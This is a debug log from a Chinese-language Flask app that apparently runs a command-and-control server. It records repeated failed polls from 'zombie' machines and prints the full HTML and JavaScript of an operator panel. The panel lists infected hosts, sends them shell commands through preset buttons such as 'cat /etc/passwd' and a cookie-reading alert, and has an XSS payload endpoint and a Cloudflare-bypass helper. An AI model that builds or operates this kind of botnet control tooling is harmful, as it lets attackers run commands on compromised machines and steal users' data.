2025-06-26 21:21:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:51 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:51] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:56 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:56] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:22:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:22:01 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:22:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:01] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:22:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:22:06 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:22:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:06] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:22:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:22:11 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:22:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:11] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:22:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:22:16 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:22:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:16] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:22:20 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:22:20 | ERROR    | control_route.py:77 | get_messages() | 獲取消息時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0025s) -> 回傳: (<Response 669 bytes [200 OK]>, 500)
2025-06-26 21:22:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:20] "[35m[1mGET /api/control/get_messages?tab=zombies HTTP/1.1[0m" 500 -
2025-06-26 21:22:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:20] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:22:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:22:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:22:21 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:22:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:21] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:22:24 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:22:24 | ERROR    | control_route.py:77 | get_messages() | 獲取消息時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0015s) -> 回傳: (<Response 669 bytes [200 OK]>, 500)
2025-06-26 21:22:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:24] "[35m[1mGET /api/control/get_messages?tab=zombies HTTP/1.1[0m" 500 -
2025-06-26 21:22:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:24] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:22:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:22:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:22:26 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:22:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:22:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:22:26] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:22:47 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:22:47 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:22:47 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:22:47 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:22:47 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:22:47 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:22:47 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:22:47 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:22:47 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 21:23:17 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 21:23:17 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 21:23:17 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 9489)
2025-06-26 21:23:17 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 21:23:17 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:23:17 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:23:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:23:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:23:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:23:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:23:17 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:23:17 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:23:17 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:23:17 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:23:17 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 21:23:47 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 21:23:47 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 21:23:47 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 9745)
2025-06-26 21:23:47 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 21:23:47 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:23:47 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:23:47 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 21:23:47 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 21:23:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:23:50 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:23:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0306s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:23:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:23:50] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 21:23:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:23:50] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 21:23:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:23:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:24:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:24:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:24:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0027s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:24:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:24:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:24:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:24:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:24:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:24:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:24:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:24:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:24:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:24:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 21:24:47 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 21:24:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 2461 bytes [200 OK]>
2025-06-26 21:24:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:47] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 21:24:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 21:24:47 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
